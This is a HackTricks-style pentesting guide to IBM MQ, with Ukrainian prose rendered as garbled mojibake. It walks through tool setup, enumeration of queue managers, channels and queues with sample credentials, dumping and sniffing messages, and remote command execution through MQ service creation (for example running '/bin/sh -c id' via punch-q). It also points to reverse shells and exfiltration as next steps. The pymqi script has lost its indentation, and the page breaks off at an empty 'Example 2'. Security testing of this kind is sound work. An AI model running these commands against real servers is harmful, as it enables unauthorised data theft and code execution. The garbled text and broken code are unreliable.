# 1414 - Pentesting IBM MQ

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic information

IBM MQ ‚Äî —Ü–µ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—è IBM –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —á–µ—Ä–≥–∞–º–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å. –Ø–∫ —ñ —ñ–Ω—à—ñ **—Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—ó –±—Ä–æ–∫–µ—Ä—ñ–≤ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å**, –≤–æ–Ω–∞ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è, –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è, –æ–±—Ä–æ–±–∫–∏ —Ç–∞ –∫–ª–∞—Å–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –º—ñ–∂ –≤–∏—Ä–æ–±–Ω–∏–∫–∞–º–∏ —Ç–∞ —Å–ø–æ–∂–∏–≤–∞—á–∞–º–∏.

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º **–≤–æ–Ω–∞ –≤—ñ–¥–∫—Ä–∏–≤–∞—î TCP –ø–æ—Ä—Ç IBM MQ 1414**. –Ü–Ω–æ–¥—ñ HTTP REST API –º–æ–∂–µ –±—É—Ç–∏ –≤—ñ–¥–∫—Ä–∏—Ç–æ –Ω–∞ –ø–æ—Ä—Ç—É **9443**. –ú–µ—Ç—Ä–∏–∫–∏ (Prometheus) —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ –∑ TCP –ø–æ—Ä—Ç—É **9157**.

TCP –ø–æ—Ä—Ç IBM MQ 1414 –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ–π –∑ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è–º–∏, —á–µ—Ä–≥–∞–º–∏, –∫–∞–Ω–∞–ª–∞–º–∏, ... –∞–ª–µ **—Ç–∞–∫–æ–∂ –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—é —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—ó**.

IBM –Ω–∞–¥–∞—î –≤–µ–ª–∏–∫—É —Ç–µ—Ö–Ω—ñ—á–Ω—É –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—é, –¥–æ—Å—Ç—É–ø–Ω—É –Ω–∞ [https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq).

## Tools

–†–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –ª–µ–≥–∫–æ–≥–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó ‚Äî **[punch-q](https://github.com/sensepost/punch-q)**, –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º Docker. –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –∞–∫—Ç–∏–≤–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É Python `pymqi`.

–î–ª—è –±—ñ–ª—å—à —Ä—É—á–Ω–æ–≥–æ –ø—ñ–¥—Ö–æ–¥—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É Python **[pymqi](https://github.com/dsuch/pymqi)**. [–ó–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ IBM MQ](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc) –ø–æ—Ç—Ä—ñ–±–Ω—ñ.

### Installing pymqi

**–ó–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ IBM MQ** –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏:

1. –°—Ç–≤–æ—Ä—ñ—Ç—å –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å (IBMid) –Ω–∞ [https://login.ibm.com/](https://login.ibm.com/).
2. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ IBM MQ –∑ [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc). –î–ª—è Linux x86_64 —Ü–µ **9.0.0.4-IBM-MQC-LinuxX64.tar.gz**.
3. –†–æ–∑–ø–∞–∫—É–π—Ç–µ (`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`).
4. –ó–∞–ø—É—Å—Ç—ñ—Ç—å `sudo ./mqlicense.sh`, —â–æ–± –ø—Ä–∏–π–Ω—è—Ç–∏ —É–º–æ–≤–∏ –ª—ñ—Ü–µ–Ω–∑—ñ—ó.

>–Ø–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ Kali Linux, –∑–º—ñ–Ω—ñ—Ç—å —Ñ–∞–π–ª `mqlicense.sh`: –≤–∏–¥–∞–ª—ñ—Ç—å/–∑–∞–∫–æ–º–µ–Ω—Ç—É–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Ä—è–¥–∫–∏ (–º—ñ–∂ —Ä—è–¥–∫–∞–º–∏ 105-110):
>
>```bash
>if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>  then
>    echo "ERROR: This package is incompatible with this system"
>    echo "       This package was built for ${BUILD_PLATFORM}"
>    exit 1
>fi
>```

5. –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å —Ü—ñ –ø–∞–∫–µ—Ç–∏:
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. –ü–æ—Ç—ñ–º —Ç–∏–º—á–∞—Å–æ–≤–æ –¥–æ–¥–∞–π—Ç–µ —Ñ–∞–π–ª–∏ `.so` –¥–æ LD: `export LD_LIBRARY_PATH=/opt/mqm/lib64`, **–ø–µ—Ä–µ–¥** –∑–∞–ø—É—Å–∫–æ–º —ñ–Ω—à–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ü—ñ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ.

–ü–æ—Ç—ñ–º –≤–∏ –º–æ–∂–µ—Ç–µ –∫–ª–æ–Ω—É–≤–∞—Ç–∏ –ø—Ä–æ–µ–∫—Ç [**pymqi**](https://github.com/dsuch/pymqi): –≤—ñ–Ω –º—ñ—Å—Ç–∏—Ç—å —Ü—ñ–∫–∞–≤—ñ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∏ –∫–æ–¥—É, –∫–æ–Ω—Å—Ç–∞–Ω—Ç–∏, ... –ê–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: `pip install pymqi`.

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è punch-q

#### –ó Docker

–ü—Ä–æ—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ: `sudo docker run --rm -ti leonjza/punch-q`.

#### –ë–µ–∑ Docker

–ö–ª–æ–Ω—É–π—Ç–µ –ø—Ä–æ–µ–∫—Ç [**punch-q**](https://github.com/sensepost/punch-q), –∞ –ø–æ—Ç—ñ–º –¥–æ—Ç—Ä–∏–º—É–π—Ç–µ—Å—å —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ–π —É readme –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ (`pip install -r requirements.txt && python3 setup.py install`).

–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –π–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ –∫–æ–º–∞–Ω–¥–æ—é `punch-q`.

## –ü–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è

–í–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ **—ñ–º'—è –º–µ–Ω–µ–¥–∂–µ—Ä–∞ —á–µ—Ä–≥, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –∫–∞–Ω–∞–ª–∏ —Ç–∞ —á–µ—Ä–≥–∏** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **punch-q** –∞–±–æ **pymqi**.

### –ú–µ–Ω–µ–¥–∂–µ—Ä —á–µ—Ä–≥

–Ü–Ω–æ–¥—ñ –Ω–µ–º–∞—î –∑–∞—Ö–∏—Å—Ç—É –≤—ñ–¥ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —ñ–º–µ–Ω—ñ –º–µ–Ω–µ–¥–∂–µ—Ä–∞ —á–µ—Ä–≥:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### Channels

**punch-q** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–π (–º–æ–¥–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π) —Å–ø–∏—Å–æ–∫ —Å–ª—ñ–≤ –¥–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —ñ—Å–Ω—É—é—á–∏—Ö –∫–∞–Ω–∞–ª—ñ–≤. –ü—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
–í–∏—è–≤–ª—è—î—Ç—å—Å—è, —â–æ –¥–µ—è–∫—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ IBM MQ –ø—Ä–∏–π–º–∞—é—Ç—å **–Ω–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ** MQ –∑–∞–ø–∏—Ç–∏, —Ç–æ–º—É `--username / --password` –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω—ñ. –ó–≤–∏—á–∞–π–Ω–æ, –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø—É —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –≤–∞—Ä—ñ—é–≤–∞—Ç–∏—Å—è.

–Ø–∫ —Ç—ñ–ª—å–∫–∏ –º–∏ –æ—Ç—Ä–∏–º–∞—î–º–æ –æ–¥–Ω–µ —ñ–º'—è –∫–∞–Ω–∞–ª—É (—Ç—É—Ç: `DEV.ADMIN.SVRCONN`), –º–∏ –º–æ–∂–µ–º–æ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –≤—Å—ñ —ñ–Ω—à—ñ –∫–∞–Ω–∞–ª–∏.

–ü–µ—Ä–µ—Ä–∞—Ö—É–Ω–æ–∫ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—å–æ–≥–æ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞ –∫–æ–¥—É `code/examples/dis_channels.py` –∑ **pymqi**:
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
... –ê–ª–µ **punch-q** —Ç–∞–∫–æ–∂ –≤–±—É–¥–æ–≤—É—î —Ü—é —á–∞—Å—Ç–∏–Ω—É (–∑ –±—ñ–ª—å—à–æ—é –∫—ñ–ª—å–∫—ñ—Å—Ç—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó!).
–ô–æ–≥–æ –º–æ–∂–Ω–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### –ß–µ—Ä–≥–∏

There is a code snippet with **pymqi** (`dis_queues.py`) but **punch-q** permits to retrieve more pieces of info about the queues:
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## Exploit

### Dump messages

–í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞—Ü—ñ–ª–∏—Ç–∏—Å—è –Ω–∞ —á–µ—Ä–≥—É(–∏)/–∫–∞–Ω–∞–ª(–∏), —â–æ–± –ø–µ—Ä–µ—Ö–æ–ø–∏—Ç–∏ / —Å–∫–∏–Ω—É—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –Ω–∏—Ö (–Ω–µ–∫–æ–Ω—Å—Ç—Ä—É–∫—Ç–∏–≤–Ω–∞ –æ–ø–µ—Ä–∞—Ü—ñ—è). *–ü—Ä–∏–∫–ª–∞–¥–∏:*
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**–ù–µ —Å–æ—Ä–æ–º—Ç–µ—Å—è —ñ—Ç–µ—Ä—É–≤–∞—Ç–∏ –≤—Å—ñ –≤–∏—è–≤–ª–µ–Ω—ñ —á–µ—Ä–≥–∏.**

### –í–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É

> –î–µ–∫—ñ–ª—å–∫–∞ –¥–µ—Ç–∞–ª–µ–π –ø–µ—Ä–µ–¥ –ø—Ä–æ–¥–æ–≤–∂–µ–Ω–Ω—è–º: IBM MQ –º–æ–∂–Ω–∞ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –∫—ñ–ª—å–∫–æ–º–∞ —Å–ø–æ—Å–æ–±–∞–º–∏: MQSC, PCF, Control Command. –î–µ—è–∫—ñ –∑–∞–≥–∞–ª—å–Ω—ñ —Å–ø–∏—Å–∫–∏ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó IBM MQ](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison).
> [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats) (***–ü—Ä–æ–≥—Ä–∞–º–æ–≤–∞–Ω—ñ —Ñ–æ—Ä–º–∞—Ç–∏ –∫–æ–º–∞–Ω–¥***) - —Ü–µ —Ç–µ, –Ω–∞ —á–æ–º—É –º–∏ –∑–æ—Å–µ—Ä–µ–¥–∂–µ–Ω—ñ –¥–ª—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ—ó –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ –µ–∫–∑–µ–º–ø–ª—è—Ä–æ–º. **punch-q** —ñ, –∫—Ä—ñ–º —Ç–æ–≥–æ, **pymqi** –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ –≤–∑–∞—î–º–æ–¥—ñ—ó PCF.
>
> –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥ PCF:
> * [–ó –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó PCF](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats), —Ç–∞
> * [–∑ –∫–æ–Ω—Å—Ç–∞–Ω—Ç](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes).
>
> –û–¥–Ω–∞ —Ü—ñ–∫–∞–≤–∞ –∫–æ–º–∞–Ω–¥–∞ - —Ü–µ `MQCMD_CREATE_SERVICE`, –∞ —ó—ó –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—è –¥–æ—Å—Ç—É–ø–Ω–∞ [—Ç—É—Ç](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms). –í–æ–Ω–∞ –ø—Ä–∏–π–º–∞—î —è–∫ –∞—Ä–≥—É–º–µ–Ω—Ç `StartCommand`, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –ª–æ–∫–∞–ª—å–Ω—É –ø—Ä–æ–≥—Ä–∞–º—É –Ω–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ (–ø—Ä–∏–∫–ª–∞–¥: `/bin/sh`).
>
> –£ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó —Ç–∞–∫–æ–∂ —î –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è –ø—Ä–æ –∫–æ–º–∞–Ω–¥—É: *"–£–≤–∞–≥–∞: —Ü—è –∫–æ–º–∞–Ω–¥–∞ –¥–æ–∑–≤–æ–ª—è—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—É –∫–æ–º–∞–Ω–¥—É –∑ –ø—Ä–∞–≤–∞–º–∏ mqm. –Ø–∫—â–æ –Ω–∞–¥–∞–Ω–æ –ø—Ä–∞–≤–∞ –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó –∫–æ–º–∞–Ω–¥–∏, –∑–ª–æ–≤–º–∏—Å–Ω–∏–π –∞–±–æ –Ω–µ–¥–±–∞–ª–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –≤–∏–∑–Ω–∞—á–∏—Ç–∏ —Å–µ—Ä–≤—ñ—Å, —è–∫–∏–π –ø–æ—à–∫–æ–¥–∏—Ç—å –≤–∞—à—ñ —Å–∏—Å—Ç–µ–º–∏ –∞–±–æ –¥–∞–Ω—ñ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏–¥–∞–ª–∏–≤—à–∏ –≤–∞–∂–ª–∏–≤—ñ —Ñ–∞–π–ª–∏."*
>
> *–ü—Ä–∏–º—ñ—Ç–∫–∞: –∑–∞–≤–∂–¥–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó IBM MQ (–ü–æ—Å—ñ–±–Ω–∏–∫ –∑ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä—É–≤–∞–Ω–Ω—è), —Ç–∞–∫–æ–∂ —î HTTP-—ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å –∑–∞ –∞–¥—Ä–µ—Å–æ—é `/admin/action/qmgr/{qmgrName}/mqsc` –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏ MQSC –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–µ—Ä–≤—ñ—Å—É (`DEFINE SERVICE`). –¶–µ–π –∞—Å–ø–µ–∫—Ç —â–µ –Ω–µ –æ—Ö–æ–ø–ª–µ–Ω–∏–π —Ç—É—Ç.*

–°—Ç–≤–æ—Ä–µ–Ω–Ω—è / –≤–∏–¥–∞–ª–µ–Ω–Ω—è —Å–µ—Ä–≤—ñ—Å—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é PCF –¥–ª—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—Ä–æ–≥—Ä–∞–º–∏ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **punch-q**:

**–ü—Ä–∏–∫–ª–∞–¥ 1**
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> –£ –∂—É—Ä–Ω–∞–ª–∞—Ö IBM MQ –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏, —â–æ –∫–æ–º–∞–Ω–¥–∞ —É—Å–ø—ñ—à–Ω–æ –≤–∏–∫–æ–Ω–∞–Ω–∞:
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: –ö–æ–º–∞–Ω–¥–∞ '808544aa7fc94c48' —Ä–æ–∑–ø–æ—á–∞—Ç–∞. ProcessId(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ —ñ—Å–Ω—É—é—á—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –Ω–∞ –º–∞—à–∏–Ω—ñ (—Ç—É—Ç `/bin/doesnotexist` ... –Ω–µ —ñ—Å–Ω—É—î):
```bash
‚ùØ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–∏ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–∏–π. –¢–æ–º—É –≤–∞–º –ø–æ—Ç—Ä—ñ–±–µ–Ω –¥—Ä—É–≥–∏–π –µ–ª–µ–º–µ–Ω—Ç –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –µ–∫—Å–ø–ª–æ–π—Ç—É** ***(—Å–ª—É—Ö–∞—á –¥–ª—è –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ —à–µ–ª–ª—É, —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ–∞–π–ª—É –Ω–∞ —Ä—ñ–∑–Ω–æ–º—É —Å–µ—Ä–≤—ñ—Å—ñ, –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—è –¥–∞–Ω–∏—Ö —á–µ—Ä–µ–∑ –º–µ—Ä–µ–∂—É ...)***

**–ü—Ä–∏–∫–ª–∞–¥ 2**

